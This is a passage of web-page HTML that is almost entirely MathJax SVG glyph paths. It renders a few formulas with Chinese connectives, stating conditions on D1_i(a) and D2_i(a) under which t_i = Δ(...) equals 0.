749Z"></path></g><g data-mml-node="mo" transform="translate(2849.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msubsup" transform="translate(3905.1,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(5169.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(5558.7,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(6087.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(6754.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(7810.2,0)"><path data-c="221E" d="M55 217Q55 305 111 373T254 442Q342 442 419 381Q457 350 493 303L507 284L514 294Q618 442 747 442Q833 442 888 374T944 214Q944 128 889 59T743 -11Q657 -11 580 50Q542 81 506 128L492 147L485 137Q381 -11 252 -11Q166 -11 111 57T55 217ZM907 217Q907 285 869 341T761 397Q740 397 720 392T682 378T648 359T619 335T594 310T574 285T559 263T548 246L543 238L574 198Q605 158 622 138T664 94T714 61T765 51Q827 51 867 100T907 217ZM92 214Q92 145 131 89T239 33Q357 33 456 193L425 233Q364 312 334 337Q285 380 233 380Q171 380 132 331T92 214Z"></path></g></g></g></svg></mjx-container>时，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.661ex;" xmlns="http://www.w3.org/2000/svg" width="25.009ex" height="2.548ex" role="img" focusable="false" viewBox="0 -833.9 11053.8 1126.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(394,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(965.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2021.5,0)"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"></path></g><g data-mml-node="mo" transform="translate(2854.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msubsup" transform="translate(3243.5,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(4508.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4897.1,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(5426.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5815.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(6259.7,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(7524.3,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(7913.3,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(8442.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(8831.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(9498.1,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(10553.8,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></svg></mjx-container></p><p>当<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.661ex;" xmlns="http://www.w3.org/2000/svg" width="19.933ex" height="2.548ex" role="img" focusable="false" viewBox="0 -833.9 8810.2 1126.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1264.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1653.6,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(2182.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2849.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msubsup" transform="translate(3905.1,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(5169.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(5558.7,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(6087.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(6754.4,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="mi" transform="translate(7810.2,0)"><path data-c="221E" d="M55 217Q55 305 111 373T254 442Q342 442 419 381Q457 350 493 303L507 284L514 294Q618 442 747 442Q833 442 888 374T944 214Q944 128 889 59T743 -11Q657 -11 580 50Q542 81 506 128L492 147L485 137Q381 -11 252 -11Q166 -11 111 57T55 217ZM907 217Q907 285 869 341T761 397Q740 397 720 392T682 378T648 359T619 335T594 310T574 285T559 263T548 246L543 238L574 198Q605 158 622 138T664 94T714 61T765 51Q827 51 867 100T907 217ZM92 214Q92 145 131 89T239 33Q357 33 456 193L425 233Q364 312 334 337Q285 380 233 380Q171 380 132 331T92 214Z"></path></g></g></g></svg></mjx-container>时，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.661ex;" xmlns="http://www.w3.org/2000/svg" width="25.056ex" height="2.548ex" role="img" focusable="false" viewBox="0 -833.9 11074.8 1126.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(394,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(965.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2021.5,0)"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"></path></g><g data-mml-node="mo" transform="translate(2854.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msubsup" transform="translate(3243.5,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,363) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(861,-284.4) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(4508.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4897.1,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(5426.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5815.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 